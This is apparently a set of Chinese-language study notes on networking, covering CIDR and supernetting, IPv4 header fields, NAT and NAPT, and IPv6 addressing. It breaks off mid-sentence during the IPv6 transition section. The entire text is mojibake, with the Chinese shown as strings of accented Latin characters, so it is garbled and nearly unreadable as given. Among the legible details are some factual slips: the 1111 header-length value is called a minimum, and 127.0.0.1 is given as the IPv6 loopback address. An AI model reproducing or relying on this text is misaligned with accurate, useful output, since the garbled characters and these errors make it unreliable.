è·¯ç”±è¡¨ä¸­çš„æ¯ä¸€ä¸ªé¡¹ç›®ï¼Œé™¤äº†è¦ç»™å‡ºç›®çš„ç½‘ç»œåœ°å€å¤–ï¼Œè¿˜å¿…é¡»åŒæ—¶ç»™å‡ºè¯¥ç½‘ç»œçš„å­ç½‘æ©ç  è‹¥ä¸€ä¸ªè·¯ç”±å™¨è¿æ¥åœ¨ä¸¤ä¸ªå­ç½‘ä¸Šï¼Œå°±æ‹¥æœ‰ä¸¤ä¸ªç½‘ç»œåœ°å€å’Œä¸¤ä¸ªå­ç½‘æ©ç  å›ºå®šé•¿åº¦å­ç½‘å’Œå˜é•¿å­ç½‘ æœ‰å›ºå®šé•¿åº¦å­ç½‘å’Œå˜é•¿å­ç½‘ä¸¤ç§å­ç½‘åˆ’åˆ†æ–¹æ³•ã€‚\nåœ¨é‡‡ç”¨å›ºå®šé•¿åº¦å­ç½‘æ—¶ï¼Œæ‰€åˆ’åˆ†çš„æ‰€æœ‰å­ç½‘çš„å­ç½‘æ©ç éƒ½æ˜¯ç›¸åŒçš„\nè¶…ç½‘ï¼ˆæ— åˆ†ç±»ç¼–å€ï¼‰CIDR â€“ Classless Inter-Domain Routing B ç±»åœ°å€åœ¨ 1992 å¹´å·²åˆ†é…äº†è¿‘ä¸€åŠï¼Œçœ¼çœ‹å°±è¦åœ¨ 1994 å¹´ 3 æœˆå…¨éƒ¨åˆ†é…å®Œæ¯•ï¼ äº’è”ç½‘ä¸»å¹²ç½‘ä¸Šçš„è·¯ç”±è¡¨ä¸­çš„é¡¹ç›®æ•°æ€¥å‰§å¢é•¿ï¼ˆä»å‡ åƒä¸ªå¢é•¿åˆ°å‡ ä¸‡ä¸ªï¼‰ã€‚ æ•´ä¸ª IPv4 çš„åœ°å€ç©ºé—´æœ€ç»ˆå°†å…¨éƒ¨è€—å°½ äº§ç”Ÿçš„ä¸»è¦åŸå› å°±æ˜¯IPä¸å¤Ÿäº†\nCIDRæ¶ˆé™¤äº†A/B/Cç±»çš„åˆ’åˆ†ï¼Œå› æ­¤å¯ä»¥æ›´åŠ æœ‰æ•ˆåœ°åˆ†é…IPv4çš„åœ°å€ç©ºé—´ï¼š\nç½‘ç»œå·å’Œå­ç½‘å· -\u0026gt; å„ç§é•¿åº¦çš„â€œç½‘ç»œå‰ç¼€â€(network-prefix) ä¸‰çº§åœ°å€ -\u0026gt; ä¸¤çº§åœ°å€ CIDR ä½¿ç”¨ â€œæ–œçº¿è®°æ³•â€(slash notation)ï¼Œåˆç§°ä¸º CIDR è®°æ³•ï¼š\nåœ¨ IP åœ°å€é¢åŠ ä¸Šä¸€ä¸ªæ–œçº¿â€œ/â€ï¼Œç„¶åå†™ä¸Šç½‘ç»œå‰ç¼€æ‰€å çš„ä½æ•° -\u0026gt; ä»£æ›¿äº†å­ç½‘æ©ç çš„ä½œç”¨\n/20çš„æ„æ€æ˜¯å‰é¢æœ‰20ä¸ª1çš„æ©ç ï¼Œå› æ­¤è™½ç„¶CIDRä¸ä½¿ç”¨å­ç½‘æ©ç äº†ï¼Œä½†ä»ç„¶ä½¿ç”¨æ©ç è¿™ä¸€æ¦‚å¿µ\nä¾‹å¦‚ï¼š 220.78.168.0/24\nCIDRåœ°å€å— CIDR æŠŠç½‘ç»œå‰ç¼€éƒ½ç›¸åŒçš„è¿ç»­çš„ IP åœ°å€ç»„æˆâ€œCIDR åœ°å€å—â€\nå¦‚ï¼Œ128.14.32.0/20 è¡¨ç¤ºçš„åœ°å€å—å…±æœ‰ $2^{12}$ ä¸ªåœ°å€ï¼Œç®€ç§°ä¸ºâ€œ/20 åœ°å€å—â€ï¼Œæœ€å°åœ°å€ï¼š128.14.32.0ï¼Œæœ€å¤§åœ°å€ï¼š128.14.47.255\nps.å…¨ 0 å’Œå…¨ 1 çš„ä¸»æœºå·åœ°å€ä¸€èˆ¬ä¸ä½¿ç”¨\nè·¯ç”±èšåˆ (route aggregation)/æ„æˆè¶…ç½‘ (supernetting) ä¸€ä¸ª CIDR åœ°å€å—å¯ä»¥è¡¨ç¤ºå¾ˆå¤šåœ°å€ï¼Œè¿™ç§åœ°å€çš„èšåˆå¸¸ç§°ä¸ºè·¯ç”±èšåˆ\nç”±äºç›¸åŒçš„IPåœ°å€ç”±äºç½‘ç»œå‰ç¼€çš„ä¸åŒå¯ä»¥è¡¨è¾¾ä¸åŒçš„æ„æ€ï¼Œè€Œç½‘ç»œå‰ç¼€çš„ä½æ•°åˆæä¸ºè‡ªç”±ï¼Œæ‰€ä»¥æå¤§åœ°æ‰©å±•äº†IPåœ°å€çš„æ•°é‡\nä¼˜ç‚¹ï¼š\nå› ä¸ºç½‘ç»œå‰ç¼€çš„ä½æ•°æ˜¯éšæ„å®šçš„ï¼Œæ‰€ä»¥è·¯ç”±è¡¨ä¸­çš„ä¸€ä¸ªé¡¹ç›®å¯ä»¥è¡¨ç¤ºå¾ˆå¤šä¸ªï¼ˆä¾‹å¦‚ä¸Šåƒä¸ªï¼‰åŸæ¥ä¼ ç»Ÿåˆ†ç±»åœ°å€çš„è·¯ç”± æœ‰åˆ©äºå‡å°‘è·¯ç”±å™¨ä¹‹é—´çš„è·¯ç”±é€‰æ‹©ä¿¡æ¯çš„äº¤æ¢ï¼Œä»è€Œæé«˜äº†æ•´ä¸ªäº’è”ç½‘çš„æ€§èƒ½ CIDRçš„ç®€å†™ 10.0.0.0/10 å¯ç®€å†™ä¸º 10/10ï¼Œä¹Ÿå°±æ˜¯æŠŠç‚¹åˆ†åè¿›åˆ¶ä¸­ä½ä½è¿ç»­çš„ 0 çœç•¥ ç½‘ç»œå‰ç¼€çš„åé¢åŠ ä¸€ä¸ªæ˜Ÿå· * çš„è¡¨ç¤ºæ–¹æ³•ï¼Œå¦‚ 00001010 00*ï¼Œåœ¨æ˜Ÿå· * ä¹‹å‰æ˜¯ç½‘ç»œå‰ç¼€ï¼Œè€Œæ˜Ÿå· * è¡¨ç¤º IP åœ°å€ä¸­çš„ä¸»æœºå·ï¼Œå¯ä»¥æ˜¯ä»»æ„å€¼ CIDRçš„ç‰¹ç‚¹ å‰ç¼€é•¿åº¦ä¸è¶…è¿‡ 23 ä½çš„ CIDR åœ°å€å—éƒ½åŒ…å«äº†å¤šä¸ª C ç±»åœ°å€ï¼Œè¿™äº› C ç±»åœ°å€åˆèµ·æ¥å°±æ„æˆäº†è¶…ç½‘ã€‚ CIDR åœ°å€å—ä¸­çš„åœ°å€æ•°ä¸€å®šæ˜¯ 2 çš„æ•´æ•°æ¬¡å¹‚ã€‚ ç½‘ç»œå‰ç¼€è¶ŠçŸ­ï¼Œå…¶åœ°å€å—æ‰€åŒ…å«çš„åœ°å€æ•°å°±è¶Šå¤šã€‚è€Œåœ¨ä¸‰çº§ç»“æ„çš„IPåœ°å€ä¸­ï¼Œåˆ’åˆ†å­ç½‘æ˜¯ä½¿ç½‘ç»œå‰ç¼€å˜é•¿ã€‚ åœ°å€èšåˆ è¿™æ ·å­è·¯ç”±å™¨å°±åªéœ€è¦è®°ä½206.0.68.0/22å°±ğŸ†—äº†ï¼Œå‰©ä¸‹å¤§å­¦å„ä¸ªç³»çš„IPåœ°å€æ€ä¹ˆæ ·ç”±å¤§å­¦è‡ªå·±ç¡®å®šï¼Œè¿™æ ·è·¯ç”±å™¨çš„è´Ÿæ‹…å°±å‡å°‘äº†ã€‚\nè¿™é‡Œå…¶å®æ˜¯ç”¨äº†ä¸€ç§éå¸¸ä¼˜é›…çš„æ–¹å¼è¡¨è¾¾åˆ’åˆ†å­ç½‘çš„æ¦‚å¿µ\nIPæ•°æ®æŠ¥ é¦–éƒ¨ ï¼ˆæ¯ä¸€è¡Œæ˜¯4å­—èŠ‚ï¼Œå›ºå®šéƒ¨åˆ†ä¸€å…±äº”è¡Œï¼Œä¸€å…±20å­—èŠ‚ï¼‰\nç‰ˆæœ¬å·ï¼šipv4ã€ipv6ç­‰ç‰ˆæœ¬å· é¦–éƒ¨é•¿åº¦ï¼šæœ€çŸ­ä¸º0101ï¼Œå•ä½ä¸ºå››ä¸ªå­—èŠ‚ã€‚ä¹Ÿå°±æ˜¯è¯´é¦–éƒ¨çš„é•¿åº¦æœ€ä½ä¸º5*4ä¸ªå­—èŠ‚ï¼›è¿™åŒæ—¶ä¹Ÿè¯´æ˜äº†é¦–éƒ¨çš„é•¿åº¦æœ€ä½ä¸º1111ä¹Ÿå°±æ˜¯15*4ä¸ªå­—èŠ‚ åŒºåˆ†æœåŠ¡ï¼šç”¨äºåŒºåˆ†å‘ä¸åŒæ•°æ®æŠ¥æä¾›çš„æœåŠ¡ï¼Œä¸€èˆ¬æ¥è¯´æ²¡æœ‰ç”¨ æ€»é•¿åº¦ï¼šä¸€å…±16ä½ï¼Œæ€»é•¿åº¦=é¦–éƒ¨+æ•°æ®ï¼Œå•ä½ä¸ºå­—èŠ‚ã€‚æ‰€ä»¥æ€»é•¿åº¦æœ€å¤§å¯ä»¥åˆ°$2^{16} â€“ 1 = 65535$ å­—èŠ‚ã€‚ä½†è¿™åªæ˜¯ç†è®ºé•¿åº¦ï¼Œç”±äºä»¥å¤ªç½‘é“¾è·¯å±‚å¸§é•¿åº¦çš„é™åˆ¶ï¼ŒIPæ•°æ®æŠ¥çš„æ€»é•¿åº¦ä¸å¾—è¶…è¿‡æœ€å¤§ä¼ é€å•å…ƒMTUä¹Ÿå°±æ˜¯1500ä¸ªå­—èŠ‚ æ ‡è¯† identificationï¼šå 16ä½ï¼ŒIPè½¯ä»¶ä¸€ç›´åœ¨è®°å½•äº§ç”Ÿäº†å¤šå°‘ä¸ªIPæ•°æ®æŠ¥ã€‚å½“IPæ•°æ®æŠ¥å› ä¸ºè¿‡é•¿è€Œä¸å¾—ä¸æ‹†åˆ†æ—¶ï¼Œè½¯ä»¶å°±å°†è®¡æ•°èµ‹äºˆè¿™ä¸ªæ•°æ®æŠ¥çš„æ‰€æœ‰åˆ†ç»„çš„æ ‡è¯†ä½ æ ‡å¿—/æ——æ ‡ flagï¼šä¸€å…±ä¸‰ä½ï¼Œä½†ç›®å‰åªæœ‰ä¸¤ä½æœ‰æ„ä¹‰ æœ€ä½ä½ä¸ºMF MF=1-\u0026gt;åé¢è¿˜æœ‰åˆ†ç‰‡ MF=0-\u0026gt;è¿™æ˜¯æœ€åä¸€ä¸ªåˆ†ç‰‡ ä¸­é—´ä½ä¸ºDF DF=1-\u0026gt;ä¸èƒ½åˆ†ç‰‡ DF=0-\u0026gt;å…è®¸åˆ†ç‰‡ ç‰‡åç§»ï¼šå 13ä½ï¼Œè¡¨ç¤ºæ”¹åˆ†ç‰‡åœ¨åŸæœ¬çš„æ•°æ®æŠ¥ä¸­çš„åç§»é‡ï¼Œä¹Ÿå°±æ˜¯å…¶ç›¸å¯¹ä½ç½®ã€‚å•ä½ä¸º8ä¸ªå­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯è¯´æ¯ä¸€ä¸ªåˆ†ç‰‡é•¿åº¦å¿…ç„¶ä¸º8ä¸ªå­—èŠ‚çš„æ•´æ•°å€ åˆ†ç‰‡ä¸»è¦æ˜¯ä¸ºäº†æ»¡è¶³é“¾è·¯å±‚çš„é™åˆ¶ ä½†æ˜¯åˆ†ç‰‡é€ æˆæ•°æ®é‡å’Œä»»åŠ¡é‡çš„å¢åŠ  ç”Ÿå­˜ç©ºé—´ TTLï¼šä¸€å…±å…«ä½ ä¸€å¼€å§‹è¡¨ç¤ºæ•°æ®æŠ¥åœ¨ç½‘ç»œä¸­çš„å¯¿å‘½ï¼Œå½“æ•°æ®æŠ¥ç»è¿‡ä¸€ä¸ªè·¯ç”±å™¨ï¼Œå°±å‡å»åœ¨è¿™ä¸ªè·¯ç”±å™¨æ¶ˆè€—çš„æ—¶é—´ï¼ˆå¦‚æœæ—¶é—´å°äº1så°±å½“ä½œ1sï¼‰ï¼Œé˜²æ­¢æ— æ•ˆçš„æ•°æ®æŠ¥åœ¨ç½‘ç»œä¸­å…œåœˆå­ åæ¥æŠ€æœ¯è¿›æ­¥ï¼Œæ•°æ®æŠ¥åœ¨è·¯ç”±å™¨èŠ±è´¹çš„æ—¶é—´å¾€å¾€è¿œå°äº1sï¼ŒTTLæ„ä¹‰å˜ä¸ºè·³æ•°é™åˆ¶çš„æ„æ€ï¼Œæ¯ç»è¿‡ä¸€ä¸ªè·¯ç”±å™¨å°±å‡1 åè®®ï¼š8ä½ï¼Œè¡¨ç¤ºç½‘ç»œå±‚åº”è¯¥ä¸Šäº¤ç»™ä»€ä¹ˆåè®® é¦–éƒ¨æ£€éªŒå’Œï¼š16ä½ï¼Œåªæ£€éªŒæ•°æ®æŠ¥çš„é¦–éƒ¨ï¼Œä½†ä¸åŒ…æ‹¬æ•°æ®éƒ¨åˆ†ï¼Œä»¥èŠ‚çœæ—¶é—´ ä¸é‡‡ç”¨CRCï¼Œé‡‡ç”¨å¦ä¸€ç§ç®€å•è®¡ç®—æ–¹æ³•ï¼š å‘é€æ–¹ï¼š æŠŠé¦–éƒ¨åˆ†æˆå¾ˆå¤šä¸ª16ä½çš„åºåˆ— æŠŠæ£€éªŒå’Œçš„é‚£16ä½ç½®é›¶ æŠŠæ‰€æœ‰åºåˆ—æŒ‰åç ç›¸åŠ ï¼Œç»“æœå†™å…¥æ£€éªŒå’Œå­—æ®µ å†å¯¹ç»“æœå–å æ¥æ”¶æ–¹ï¼š æŠŠé¦–éƒ¨åˆ†æˆå¾ˆå¤šä¸ª16ä½çš„åºåˆ— æŠŠæ‰€æœ‰åºåˆ—æŒ‰åç ç›¸åŠ  å¦‚æœé¦–éƒ¨æ— è¯¯ï¼Œåˆ™ç»“æœå¿…ä¸º0 æºåœ°å€ï¼š32ä½ ç›®çš„åœ°å€ï¼š32ä½ å¯å˜éƒ¨åˆ† IP é¦–éƒ¨çš„å¯å˜éƒ¨åˆ†å°±æ˜¯ä¸€ä¸ªé€‰é¡¹å­—æ®µï¼Œç”¨æ¥æ”¯æŒæ’é”™ã€æµ‹é‡ä»¥åŠå®‰å…¨ç­‰æªæ–½\nå¢åŠ é¦–éƒ¨çš„å¯å˜éƒ¨åˆ†æ˜¯ä¸ºäº†å¢åŠ  IP æ•°æ®æŠ¥çš„åŠŸèƒ½ï¼Œä½†è¿™åŒæ—¶ä¹Ÿä½¿å¾— IP æ•°æ®æŠ¥çš„é¦–éƒ¨é•¿åº¦æˆä¸ºå¯å˜çš„ï¼Œå¢åŠ äº†æ¯ä¸€ä¸ªè·¯ç”±å™¨å¤„ç†æ•°æ®æŠ¥çš„å¼€é”€\nå› æ­¤ï¼Œå¯å˜éƒ¨åˆ†å¾ˆå°‘è¢«ä½¿ç”¨ï¼ŒIPv6ç”šè‡³ç›´æ¥å°†æ•°æ®æŠ¥è®¾ä¸ºå›ºå®šé•¿çš„\nNAT-Network Address Translation ç½‘ç»œåœ°å€è½¬æ¢ ä½¿ç”¨NATçš„åŸå› ï¼š\nIPåœ°å€ç´§ç¼º å‡å°‘è·¯ç”±è¡¨çš„æ¡ç›®æ•°ï¼Œå‡è½»è·¯ç”±å™¨çš„è´Ÿæ‹… é€æ˜æ€§ï¼š æ›´æ”¹IPä¸éœ€è¦å¹¿è€Œå‘Šä¹‹ å¯ä»¥æ›´æ”¹ISPè€Œä¸éœ€è¦æ›´æ”¹æœ¬åœ°è®¾å¤‡çš„IPåœ°å€ å®‰å…¨æ€§ï¼šæœ¬åœ°è®¾å¤‡ä¸èƒ½ç›´æ¥è¢«å¤–ç•Œè®¿é—® æœ¬åœ°åœ°å€å’Œå…¨çƒåœ°å€ æœ¬åœ°åœ°å€ï¼šä»…åœ¨æœºæ„å†…éƒ¨ä½¿ç”¨çš„ IP åœ°å€ï¼Œå¯ä»¥ç”±æœ¬æœºæ„è‡ªè¡Œåˆ†é… å…¨çƒåœ°å€ï¼šå…¨çƒå”¯ä¸€çš„ IP åœ°å€ï¼Œå¿…é¡»å‘äº’è”ç½‘çš„ç®¡ç†æœºæ„ç”³è¯· ä½†æ˜¯å¦‚æœæœ¬åœ°åœ°å€å’Œå…¨çƒåœ°å€ä¸­æŸä¸ªåœ°å€é‡åˆï¼Œå°±ä¼šå‡ºç°äºŒä¹‰æ€§é—®é¢˜\nä¸“ç”¨äºæœ¬åœ°åœ°å€çš„åœ°å€å— è¿™ç§ç½‘ç»œåˆç§°ä¸ºä¸“ç”¨äº’è”ç½‘ã€æœ¬åœ°äº’è”ç½‘ã€ä¸“ç”¨ç½‘ è¿™ç§ç½‘ç»œçš„åœ°å€åˆç§°ä¸ºå¯é‡ç”¨åœ°å€ é‚£æœ¬åœ°ç½‘ç»œå†…çš„ä¸»æœºå¦‚ä½•ä¸äº’è”ç½‘ä¸Šçš„å…¶ä»–ä¸»æœºè¿›è¡Œé€šä¿¡ï¼ˆåœ¨ä¸éœ€è¦åŠ å¯†çš„æƒ…å†µä¸‹ï¼‰å‘¢ï¼Ÿ\nç­”æ¡ˆå°±æ˜¯NATè½¬æ¢\nNATè½¬æ¢çš„å…·ä½“å†…å®¹ NATå®é™…ä¸Šæ˜¯æœ¬åœ°ç½‘ç»œå’Œå…¨çƒç½‘ç»œä¸­é—´çš„åª’ä»‹\néœ€è¦åœ¨ä¸“ç”¨ç½‘è¿æ¥åˆ°äº’è”ç½‘çš„è·¯ç”±å™¨ä¸Šå®‰è£… NAT è½¯ä»¶ã€‚è£…æœ‰ NAT è½¯ä»¶çš„è·¯ç”±å™¨å«åš NATè·¯ç”±å™¨ï¼Œå®ƒè‡³å°‘æœ‰ä¸€ä¸ªæœ‰æ•ˆçš„å¤–éƒ¨å…¨çƒIPåœ°å€ã€‚ æ‰€æœ‰ä½¿ç”¨æœ¬åœ°åœ°å€çš„ä¸»æœºåœ¨å’Œå¤–ç•Œé€šä¿¡æ—¶ï¼Œéƒ½è¦åœ¨ NAT è·¯ç”±å™¨ä¸Šå°†å…¶æœ¬åœ°åœ°å€è½¬æ¢æˆå…¨çƒ IP åœ°å€ï¼Œæ‰èƒ½å’Œäº’è”ç½‘è¿æ¥ã€‚ å› æ­¤ï¼Œå…¨çƒåœ°å€ç›¸å½“äºä¸€ä¸ªæˆ¿å­çš„é—¨ï¼Œè€Œæˆ¿å­é‡Œçš„å„æˆ¿é—´çš„é—¨å°±æ˜¯æœ¬åœ°åœ°å€\nNATï¼šçº¯ç²¹çš„åœ°å€è½¬æ¢ï¼Œç°å®ä¸ä½¿ç”¨ NAPTï¼šåŠ ä¸Šç«¯å£ä¸€èµ·è½¬æ¢\nå¦‚æœæ²¡æœ‰NATï¼Œä¸»æœºAå¯ä»¥å‘ä¸»æœºBå‘é€æ•°æ®æŠ¥ï¼Œä½†æ˜¯ä¸»æœºBå‘ä¸å›æ¥ï¼Œå› ä¸ºç›®çš„åœ°å€æ˜¯æœ¬åœ°åœ°å€\nçº¯NATçš„è®¡ç®—æ–¹æ³• ç›´æ¥å°†æ•°æ®æŠ¥ä¸­çš„æºIPåœ°å€ï¼ˆä¸»æœºAçš„æœ¬åœ°åœ°å€ï¼‰æ›¿æ¢ä¸ºNATä¸­çš„å…¨çƒåœ°å€ï¼ŒæŠŠè½¬æ¢ç»“æœè®°å½•åˆ°NATåœ°å€è½¬æ¢è¡¨ä¸­\nå½“æ¥æ”¶æ—¶ï¼Œå°±æ ¹æ®NATåœ°å€è½¬æ¢è¡¨å°†æ•°æ®æŠ¥è½¬å‘ç»™ä¸»æœºA\nçº¯NATçš„å±€é™ å¦‚æœå…·æœ‰çš„å…¨çƒIPåœ°å€æ•°é‡å°äºä¸»æœºæ•°ï¼Œæœ¬åœ°åœ°å€è¦è½®æµä½¿ç”¨å…¨çƒåœ°å€ æ— æ³•å……å½“æœåŠ¡å™¨ä½¿ç”¨ï¼šNATåœ°å€è½¬æ¢è¡¨ä¸ç¡®å®šï¼Œä¸»æœºAåˆæ²¡æœ‰å…¨çƒåœ°å€ï¼Œä¸»æœºBæ— æ³•ç¡®å®šåœ°è®¿é—®ä¸»æœºAï¼Œå¯¼è‡´å•å‘æ€§ NAPTçš„è®¡ç®—æ–¹æ³• åªéœ€è¦ä¸€ä¸ªå…¨çƒIPåœ°å€ï¼Œä¸åŒä¸»æœºçš„IPé€šè¿‡NATè·¯ç”±å™¨çš„ç«¯å£å·æ¥åŒºåˆ†\næœ¬åœ°åœ°å€+ç«¯å£å· -\u0026gt; å…¨çƒåœ°å€+æ–°ç«¯å£å·\nå› æ­¤ï¼ŒNAPTæ˜¯ç”¨ç«¯å£å·æ¥åŒºåˆ†ä¸åŒçš„ä¸»æœºï¼Œè€Œç«¯å£å·åˆå ç”¨16ä½ï¼Œå¯ä»¥æ”¯æŒå…­ä¸‡å¤šå°æœ¬åœ°ä¸»æœº\nNAPTçš„ç¼ºç‚¹ NATæ˜¯â€œæœ‰äº‰è®®æ€§â€çš„ã€â€œä¸´æ—¶â€çš„è§£å†³æ‰‹æ®µ\nè·¯ç”±å™¨åº”è‡³å¤šåªå¤„ç†ç¬¬ä¸‰å±‚ï¼›ç«¯å£å·æ˜¯ç¬¬å››å±‚çš„ åœ°å€çŸ­ç¼ºåº”ç”±IPv6å½»åº•è§£å†³ï¼Œè€Œä¸åº”è¯¥è®©NATä½œä¸´æ—¶è§£å†³ è¿èƒŒäº†ç«¯å¯¹ç«¯åŸåˆ™ï¼ˆend-to-end argumentï¼‰ï¼Œåº”è¯¥è®©ç«¯ç³»ç»Ÿè´Ÿè´£æ™ºèƒ½è€Œä¸æ˜¯ç½‘ç»œè´Ÿè´£æ™ºèƒ½ NATåçš„ä¸»æœºä¸èƒ½åŒæ—¶ä½œä¸ºæœåŠ¡å™¨å‘å¤–æä¾›æœåŠ¡ IPv6 IPv6 ä»æ”¯æŒæ— è¿æ¥çš„ä¼ é€ï¼Œä½†å°†åè®®æ•°æ®å•å…ƒ PDU ç§°ä¸ºåˆ†ç»„ åˆ°ç›®å‰ä¸ºæ­¢ï¼ŒIPv6 è¿˜åªæ˜¯è‰æ¡ˆæ ‡å‡†é˜¶æ®µ\nIPv6çš„ç‰¹ç‚¹ æ›´å¤§çš„åœ°å€ç©ºé—´ã€‚IPv6 å°†åœ°å€ä» IPv4 çš„ 32 ä½ å¢å¤§åˆ°äº† 128 ä½ã€‚ æ‰©å±•çš„åœ°å€å±‚æ¬¡ç»“æ„ã€‚ çµæ´»çš„é¦–éƒ¨æ ¼å¼ã€‚ IPv6 å®šä¹‰äº†è®¸å¤šå¯é€‰çš„æ‰©å±•é¦–éƒ¨ã€‚ æ”¹è¿›çš„é€‰é¡¹ã€‚ IPv6 å…è®¸æ•°æ®æŠ¥åŒ…å«æœ‰é€‰é¡¹çš„æ§åˆ¶ä¿¡æ¯ï¼Œå…¶é€‰é¡¹æ”¾åœ¨æœ‰æ•ˆè½½è·ä¸­ã€‚ IPv6çš„é¦–éƒ¨ IPv6 é¦–éƒ¨æ”¹ä¸º 8 å­—èŠ‚å¯¹é½ï¼ŒåŸæ¥æ˜¯4å­—èŠ‚å¯¹é½ï¼Œä½†é¦–éƒ¨é•¿åº¦æ˜¯å›ºå®šçš„\nIPv6æ•°æ®æŠ¥ç”±åŸºæœ¬é¦–éƒ¨å’Œæœ‰æ•ˆè½½è·ä¸¤éƒ¨åˆ†ç»„æˆï¼Œæœ‰æ•ˆè½½è·ä¸­å…è®¸æœ‰é›¶ä¸ªæˆ–å¤šä¸ªæ‰©å±•é¦–éƒ¨ (extension header)ï¼Œå†åé¢æ˜¯æ•°æ®éƒ¨åˆ†\nä¸IPv4é¦–éƒ¨çš„å·®åˆ«æ˜¯ï¼š\nâŒé¦–éƒ¨é•¿åº¦ï¼ˆé•¿åº¦å›ºå®šï¼‰ âŒæœåŠ¡ç±»å‹ æ€»é•¿åº¦ -\u0026gt; æœ‰æ•ˆè½½è·é•¿åº¦ âŒæ ‡è¯†ã€æ ‡å¿—å’Œç‰‡åç§» TTL -\u0026gt; è·³æ•°é™åˆ¶å­—æ®µ åè®®å­—æ®µ -\u0026gt; ä¸‹ä¸€ä¸ªé¦–éƒ¨å­—æ®µ âŒæ£€éªŒå’Œå­—æ®µ âŒé€‰é¡¹å­—æ®µï¼ˆä½¿ç”¨æ‰©å±•é¦–éƒ¨ï¼‰ ä»è€ŒIPv6 é¦–éƒ¨çš„å­—æ®µæ•°å‡å°‘åˆ°åªæœ‰ 8 ä¸ª\nIPv6 æŠŠåŸæ¥ IPv4 é¦–éƒ¨ä¸­é€‰é¡¹çš„åŠŸèƒ½éƒ½æ”¾åœ¨æ‰©å±•é¦–éƒ¨ä¸­ï¼Œå¹¶å°†æ‰©å±•é¦–éƒ¨ç•™ç»™è·¯å¾„ä¸¤ç«¯çš„æºç«™å’Œç›®çš„ç«™çš„ä¸»æœºæ¥å¤„ç†ï¼ˆæŠŠæ™ºèƒ½çš„äº‹æƒ…äº¤ç»™ç«¯ç³»ç»Ÿï¼‰ï¼Œç»è¿‡çš„è·¯ç”±å™¨éƒ½ä¸å¤„ç†è¿™äº›æ‰©å±•é¦–éƒ¨\nIPv6çš„åœ°å€ ç›®çš„åœ°å€å¯ä»¥æ˜¯ï¼š\nå•æ’­ å¤šæ’­ ä»»æ’­ï¼ˆæ–°å¢ï¼Œä»»æ’­çš„ç»ˆç‚¹æ˜¯ä¸€ç»„è®¡ç®—æœºï¼Œä½†æ•°æ®æŠ¥åªäº¤ä»˜å…¶ä¸­çš„ä¸€ä¸ªï¼Œé€šå¸¸æ˜¯è·ç¦»æœ€è¿‘çš„ä¸€ä¸ªï¼‰ IPv6 å°†å®ç° IPv6 çš„ä¸»æœºå’Œè·¯ç”±å™¨å‡ç§°ä¸ºç»“ç‚¹ï¼Œä¸€ä¸ªç»“ç‚¹å°±å¯èƒ½æœ‰å¤šä¸ªä¸é“¾è·¯ç›¸è¿çš„æ¥å£ï¼ŒIPv6 åœ°å€æ˜¯åˆ†é…ç»™ç»“ç‚¹ä¸Šé¢çš„æ¥å£çš„ã€‚\nä¸€ä¸ªæ¥å£å¯ä»¥æœ‰å¤šä¸ªå•æ’­åœ°å€ã€‚ å…¶ä¸­çš„ä»»ä½•ä¸€ä¸ªåœ°å€éƒ½å¯ä»¥å½“ä½œåˆ°è¾¾è¯¥ç»“ç‚¹çš„ç›®çš„åœ°å€ã€‚å³ä¸€ä¸ªç»“ç‚¹æ¥å£çš„å•æ’­åœ°å€å¯ç”¨æ¥å”¯ä¸€åœ°æ ‡å¿—è¯¥ç»“ç‚¹ã€‚ å†’å·åå…­è¿›åˆ¶è®°æ³• æ¯ä¸ª 16 ä½çš„å€¼ç”¨åå…­è¿›åˆ¶å€¼è¡¨ç¤ºï¼Œå„å€¼ä¹‹é—´ç”¨å†’å·åˆ†éš”ã€‚ä¾‹å¦‚ï¼š68E6:8C64:FFFF:FFFF:0:1180:960A:FFFF\nç®€å†™ åœ¨åå…­è¿›åˆ¶è®°æ³•ä¸­ï¼Œå…è®¸æŠŠæ•°å­—å‰é¢çš„ 0 çœç•¥ã€‚ä¾‹å¦‚æŠŠ 0000 ä¸­çš„å‰ä¸‰ä¸ª 0 çœç•¥ï¼Œå†™æˆ 1 ä¸ª 0 æ¯ä¸ªåœ°å€å…è®¸ä¸”ä»…å…è®¸ä¸€æ¬¡é›¶å‹ç¼©ï¼Œå³ä¸€è¿ä¸²è¿ç»­çš„é›¶å¯ä»¥ä¸ºä¸€å¯¹å†’å·æ‰€å–ä»£ï¼Œå¦‚ï¼šFF05:0:0:0:0:0:0:B3 -\u0026gt; FF05::B3 ç‰¹æ®Šè®°æ³• å†’å·åå…­è¿›åˆ¶è®°æ³•å¯ç»“åˆä½¿ç”¨ç‚¹åˆ†åè¿›åˆ¶è®°æ³•çš„åç¼€ï¼š 128.10.2.1 -\u0026gt; 0:0:0:0:0:0:128.10.2.1 -\u0026gt; ::128.10.2.1\nCIDR çš„æ–œçº¿è¡¨ç¤ºæ³•ä»ç„¶å¯ç”¨ï¼š 60 ä½çš„å‰ç¼€ 12AB00000000CD3 å¯è®°ä¸ºï¼š12AB:0000:0000:CD30:0000:0000:0000:0000/60 -\u0026gt; 12AB::CD30:0:0:0:0/60 æˆ– 12AB:0:0:CD30::/60\nåˆ†ç±» æœªæŒ‡æ˜åœ°å€ï¼šè¿™ä¸ªåœ°å€åªèƒ½ä¸ºè¿˜æ²¡æœ‰é…ç½®åˆ°ä¸€ä¸ªæ ‡å‡†çš„ IP åœ°å€çš„ä¸»æœºå½“ä½œæºåœ°å€ä½¿ç”¨ ç¯å›åœ°å€ï¼š127.0.0.1 å¤šæ’­åœ°å€ï¼šå’ŒIPv4ä¸€æ · æœ‰äº›å•ä½çš„ç½‘ç»œä½¿ç”¨ TCP/IP åè®®ï¼Œä½†å¹¶æ²¡æœ‰è¿æ¥åˆ°äº’è”ç½‘ä¸Šã€‚è¿æ¥åœ¨è¿™æ ·çš„ç½‘ç»œä¸Šçš„ä¸»æœºéƒ½å¯ä»¥ä½¿ç”¨è¿™ç§æœ¬åœ°åœ°å€è¿›è¡Œé€šä¿¡ï¼Œä½†ä¸èƒ½å’Œäº’è”ç½‘ä¸Šçš„å…¶ä»–ä¸»æœºé€šä¿¡ã€‚ å…¨çƒå•æ’­åœ°å€ï¼šå°±æ˜¯æ™®é€šçš„å…¨çƒé€šä¿¡IP å‘IPv6è¿‡æ¸¡ æœ‰ä¸¤ç§å‘ IPv6 è¿‡æ¸¡çš„ç­–ç•¥ï¼Œå³ä½¿ç”¨åŒåè®®æ ˆå’Œä½¿ç”¨éš§é“æŠ€æœ¯\nåŒåè®®æ ˆ åŒåè®®æ ˆä¸»æœºåœ¨å’Œ IPv6 ä¸»æœºé€šä¿¡æ—¶é‡‡ç”¨ IPv6 åœ°å€ï¼Œè€Œå’Œ IPv4 